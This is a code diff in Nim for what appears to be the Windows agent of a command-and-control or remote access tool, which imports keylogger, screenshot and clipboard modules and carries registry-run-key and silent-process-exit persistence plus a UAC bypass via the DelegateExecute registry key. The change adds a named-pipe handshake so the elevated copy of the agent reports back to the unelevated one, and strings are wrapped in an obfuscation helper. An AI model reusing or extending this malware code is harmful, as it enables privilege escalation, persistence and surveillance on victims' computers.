@@ -1,7 +1,7 @@
 # Internal imports
 import ../config
 import ../common
-import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger]
+import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger, namedpipe]
 # Internal imports
 import std/[tables, nativesockets, json]
 import winim/[lean, com]
@@ -37,7 +37,7 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_patch_func(func_name: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
-proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
+proc uac_bypass(bypass_method: string, cmd: string): bool
 proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
 
@@ -442,7 +442,7 @@ proc set_spe(process_name: string, cmd: string): bool =
     return is_success
 
 
-proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
+proc uac_bypass(bypass_method: string, cmd: string): bool =
     var is_success = false
     var is_success_post: bool
     var reg_path: string
@@ -461,11 +461,13 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
     if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
         sleep(2000)
         if execCmdEx(launch, options={poDaemon}).exitCode == 0:
-            is_success = true
+            if np_client_try_connect():
+                is_success = true
+            else:
+                is_success = false
 
     var data = {
         protectString("elevated_command"): cmd,
-        protectString("keep_or_die"): keep_or_die,
         protectString("is_success"): $is_success
     }.toOrderedTable
     
@@ -475,7 +477,7 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
     regDelete(reg_path, "")
     regDelete(reg_path, protectString("DelegateExecute"))
 
-    if is_success == true and keep_or_die == "die":
+    if is_success == true:
         ExitProcess(0)
     else:
         return is_success_post
@@ -553,6 +555,10 @@ proc is_elevated(): string =
 
 
 proc windows_start*(): void =
+
+    # if spawned via uav bypass - let the unelevated agent know
+    np_server()
+
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
     if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
@@ -615,7 +621,7 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("persist-spe"):
             is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
         of protectString("uac-bypass"):
-            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr(), command[protectString("keep_or_die")].getStr())
+            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
         of protectString("msgbox"):
             # spawn in a new thread
             var title = command[protectString("title")].getStr()
